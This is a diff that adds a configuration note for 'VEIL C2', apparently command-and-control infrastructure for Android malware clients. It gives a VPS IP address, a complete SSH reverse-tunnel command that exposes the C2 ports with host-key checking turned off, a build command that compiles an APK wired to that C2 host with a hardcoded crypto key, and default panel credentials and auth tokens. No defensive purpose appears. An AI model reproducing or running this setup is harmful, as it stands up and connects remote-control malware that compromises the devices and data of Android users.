@@ -1,0 +1,42 @@
+VEIL C2 - Port Configuration
+=============================
+
+Local Server Ports:
+-------------------
+3000  - REST API (Panel + API endpoints)
+8230  - TCP C2 (Android client connection)
+8220  - HTTP Bridge (reverse proxy to VPS)
+
+VPS (152.67.155.202) Ports:
+---------------------------
+8220  - SSH tunnel forward -> local 8220 (HTTP Bridge)
+8221  - SSH tunnel forward -> local 8221 (GAS Proxy)
+8222  - SSH tunnel forward -> local 8222 (reserved)
+8230  - SSH tunnel forward -> local 8230 (TCP C2)
+
+SSH Tunnel Command:
+-------------------
+ssh -i "C:\Users\Alireza\Desktop\Oracle VMS\England\ssh-key-2026-05-31 (3).key" ^
+  -o StrictHostKeyChecking=no ^
+  -o ServerAliveInterval=30 ^
+  -o ServerAliveCountMax=3 ^
+  -N ^
+  -R 8220:127.0.0.1:8220 ^
+  -R 8221:127.0.0.1:8221 ^
+  -R 8222:127.0.0.1:8222 ^
+  -R 8230:127.0.0.1:8230 ^
+  ubuntu@152.67.155.202
+
+APK Build (connect to VPS):
+----------------------------
+gradlew assembleRelease ^
+  -Pc2_host=152.67.155.202 ^
+  -Pc2_port=8230 ^
+  -Pcrypto_key="v3ilm4sk2024veil" ^
+  -Penroll_key="changeme"
+
+Default Credentials:
+--------------------
+Panel Password: changeme
+Enroll Key: changeme
+Auth Token: VeilBridge2024
